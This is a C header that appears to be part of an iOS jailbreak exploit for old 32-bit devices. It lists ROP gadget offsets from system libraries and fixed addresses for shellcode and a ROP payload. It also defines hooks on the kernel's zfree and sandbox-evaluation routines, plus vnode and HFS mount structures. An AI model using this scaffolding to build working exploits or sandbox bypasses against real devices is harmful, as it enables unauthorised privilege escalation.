
#pragma once

#if __APPLE__
#include "defines/osx.hpp"

#include <mach/message.h>
#include <sys/proc_info.h>

#elif __linux__
#include "defines/linux.hpp"

#include <sys/ptrace.h>

#elif _WIN32
#include "defines/windows.hpp"
#endif

// offsets
#define ROP2_ABS_ADDR 0x3eb00000
#define VARS_ABS_ADDR_1 0x3eb20000

// configuration
#define ROP_FILE_NAME "payload"
#define VARS_FILE_NAME "payload-vars"
#define VARS_MAX_SIZE 0x1000

// constants
#define USELESS 0xdeadbeef
#define PLACE_HOLDER 0xdeadbeef

typedef enum
{
    vncontrol_readwrite_io_e = 0
} vncontrol_t;

typedef unsigned int __32bit_ptr;

struct vn_ioctl
{
    __32bit_ptr vn_file; /* pathname of file to mount */
    int vn_size;         /* (returned) size of disk */
    int vn_control;      /* this is vncontrol_t, but we need to ensure 32 bit size */
};

#define VNIOCATTACH _IOWR('F', 0, struct vn_ioctl) /* attach file */
#define VNIOCDETACH _IOWR('F', 1, struct vn_ioctl)

struct offsets
{
    // libsystem_kernel.dylib
    uint32_t _dsc_open;
    uint32_t _dsc_fstat;
    uint32_t _dsc_chown;
    uint32_t _dsc_chmod;
    uint32_t _dsc_memcpy;
    uint32_t _dsc_munmap;
    uint32_t _dsc_unlink;
    uint32_t _dsc_mkdir;
    uint32_t _dsc_ftruncate;
    uint32_t _dsc_ioctl;
    uint32_t _dsc_close;
    uint32_t _dsc_ptrace;
    uint32_t _dsc_bsdthread_terminate;
    uint32_t _dsc_shm_open;
    uint32_t _dsc_mmap;
    uint32_t _dsc_mach_task_self;
    uint32_t _dsc_mach_port_allocate;
    uint32_t _dsc_mach_port_insert_right;
    uint32_t _dsc_mach_msg;
    uint32_t _dsc_mount;
    uint32_t _dsc_unmount;
    uint32_t _dsc_syscall;
    uint32_t _dsc_psynch_rw_unlock;

    // libsystem_c.dylib
    uint32_t _dsc_fopen;
    uint32_t _dsc_fread;
    uint32_t _dsc_fclose;
    uint32_t _dsc_exit;
    uint32_t _dsc_syslog;
    uint32_t _dsc_sysctl;
    uint32_t _dsc_malloc;
    uint32_t _dsc_memmem;
    uint32_t _dsc_sleep;
    uint32_t _dsc_proc_pidinfo;
    uint32_t _dsc_execl;
    uint32_t _dsc_strcpy;
    uint32_t _dsc_sys_dcache_flush;

    uint32_t LIBC_POP_R0;
    // __aeabi_cfcmpeq+0x10
    uint32_t LIBC_POP_R0123;
    uint32_t LIBC_POP_R47;
    uint32_t LIBC_BLX_R4_POP_R47;
    uint32_t LIBC_MOV_SP_R4__POP_R47;
    uint32_t LIBC_STR_R0_R4__POP_R47;
    uint32_t LIBC_LDR_R0_R0__POP_R7;
    uint32_t LIBC_SUB_R0_R4__POP_R4567;
    // pthread_mutex_lock+0x1B6
    uint32_t GADGET_MOV_SP_R4_POP8_10_11_4567;

    // libicucore.A.dylib
    // uloc_toLanguageTag+0x24B2
    uint32_t GADGET_ADD_SP_120_POP8_10_4567;

    // libxml2.dylib
    // xmlRegisterInputCallbacks+0x36
    uint32_t GADGET_MOV_LR_R4_MOV_R0_LR_POP47;

    // liblaunch.dylib
    uint32_t _dsc_bootstrap_look_up;

    // libdyld.dylib
    uint32_t _dsc_dlsym;

    // libxpc.dylib
    uint32_t LIBC_BLX_R4_POP_R457;

    // /System/Library/Frameworks/CoreData.framework/CoreData
    uint32_t GADGET_SUBS_R0_R0_R1__POP7;

    // /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
    uint32_t GADGET_MOV_R1_R0__POP_R47;

    // /System/Library/Frameworks/AddressBook.framework/AddressBook
    uint32_t GADGET_MOV_R0_R1__POP_R47;
    uint32_t GADGET_MOV_R0_R4__POP_R47;

    // /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
    uint32_t GADGET_MOV_R1_R4__POP_R47;

    // /System/Library/PrivateFrameworks/DataDetectorsCore.framework/DataDetectorsCore
    uint32_t GADGET_ADD_R0_R0_R1__POP457;

    // /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
    // vt_Copy_420f_420v_arm+0x220
    // 35982100        e28dd008        add     sp, sp, #8      @ 0x8
    // 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
    // 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
    // 3598210c        e8bd0d00        pop     {r8, sl, fp}
    // 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
    uint32_t GADGET_HOLY;

    uint32_t ZFREE;
    uint32_t SYSENT;
    uint32_t FLUSH_DCACHE_ALL;
    uint32_t INVALIDATE_ICACHE_ALL;
    uint32_t SB_EVALUATE;
};

#define LOG_WARNING 4

#define SHELLCODE_ADDR 0x80000400
#define ZFREEHOOK_ADDR (offsets->ZFREE - 1)
#define ZFREEHOOKER_ADDR 0x80000600

#define SB_EVALUATEHOOK_ADDR (offsets->SB_EVALUATE - 1)
#define SB_EVALUATEHOOKER_ADDR 0x80000700

enum
{
    iPad1_1,
    iPhone2_1,
    iPhone3_1,
    iPhone3_3,
    iPhone4_1,
    iPad2_1,
    iPad2_2,
    iPad2_3,
    iPod3_1,
    iPod4_1,
    MAX_DEVICE
};

struct __darwin_timezone
{
    int tz_minuteswest; /* minutes west of Greenwich */
    int tz_dsttime;     /* type of dst correction */
};

struct hfs_mount_args
{
    __32bit_ptr fspec;
    uid_t hfs_uid;
    gid_t hfs_gid;
    __darwin_mode_t hfs_mask;
    uint32_t hfs_encoding;
    struct __darwin_timezone hfs_timezone;
    int flags;
    int journal_tbuffer_size;
    int journal_flags;
    int journal_disable;
};

#define CTL_KERN 1      /* "high kernel": proc, limits */
#define KERN_PROC 14    /* struct: process entries */
#define KERN_PROC_ALL 0 /* everything */

#define PROC_PIDREGIONPATHINFO 8
